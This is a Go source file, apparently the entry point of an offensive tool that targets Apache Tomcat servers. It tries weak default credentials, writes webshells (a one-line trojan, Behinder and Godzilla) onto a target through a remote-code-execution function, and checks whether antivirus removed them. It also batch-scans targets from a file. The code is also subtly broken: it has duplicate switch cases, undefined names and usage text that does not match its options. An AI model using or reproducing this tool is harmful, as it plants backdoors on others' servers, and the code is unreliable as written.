package main

import (
	"flag"
	"fmt"
	"runtime"
	"cloud/funcs"
	"cloud/vars"
)

func init()  {
runtime.GOMAXPROCS(runtime.NumCPU())
flag.StringVar(&vars.URL, "u", "", "目标URL")
flag.StringVar(&vars.FILE, "f", "", "导入.txt文件批量扫描")
flag.StringVar(&vars.NAME,"n", "", "tomcat常用弱口令，A admin:admin，T tomcat:tomcat")
flag.StringVar(&vars.PASS,"p", "", "tomcat弱口令自定义，例如 tomcat:s3cret")
}

func main() {
	flag.Parse()
	funcs.Menu()

	switch {
	case vars.URL != "" && vars.FILE == "":
		target := funcs.Url(vars.URL)
		name,pass := funcs.Config()
		switch name {

		case "":
			//加密key
			shellcode := funcs.enCode(pass, key)
			urll, err := funcs.Rce(target, shellname, shellcode, vars.Header)
			if err != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n", "[-]Error", err)
				return
			}
			if urll == "" {
				fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + target + "一句话马写入失败！")
				return
			}
			fmt.Printf("\033[1;31m%s\033[0m\n","[+]"+ urll+ "成功写入一句话马，正在检测是否被杀软删除！")
			funcs.Judge(urll, "shellcode", vars.Header)

		case "":
			shellcode := funcs.Behinder(pass)
			urll, err := funcs.Rce(target, shellname, shellcode, vars.Header)
			if err != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n", "[-]Error", err)
				return
			}
			if urll == "" {
				fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + target + "冰蝎马写入失败！")
				return
			}
			fmt.Printf("\033[1;31m%s\033[0m\n","[+]"+ urll+ "成功写入冰蝎马，正在检测是否被杀软删除！")
			funcs.Judge(urll, "Behinder", vars.Header)

		case "T":
			shellcode := funcs.Godzilla(pass, key)
			urll, err := funcs.Rce(target, shellname, shellcode, vars.Header)
			if err != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n", "[-]Error", err)
				return
			}
			if urll == "" {
				fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + target + "哥斯拉马写入失败！")
				return
			}
			fmt.Printf("\033[1;31m%s\033[0m\n","[+]"+ urll+ "成功写入哥斯拉马，正在检测是否被杀软删除！")
			funcs.Judge(urll, "Godzilla", vars.Header)

		default:
			fmt.Printf("\033[1;32m%s\033[0m\n", "[-]请输入正确的-n参数，上传哥斯拉马请输入G，上传冰蝎马请输入B，一句话木马默认为空")
		}

	case vars.URL == "" && vars.FILE != "":
		task.Concurrent()

	default:
		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]请输入正确的指令例如：./cloud -u https://127.0.0.1 -n A ")
	}
}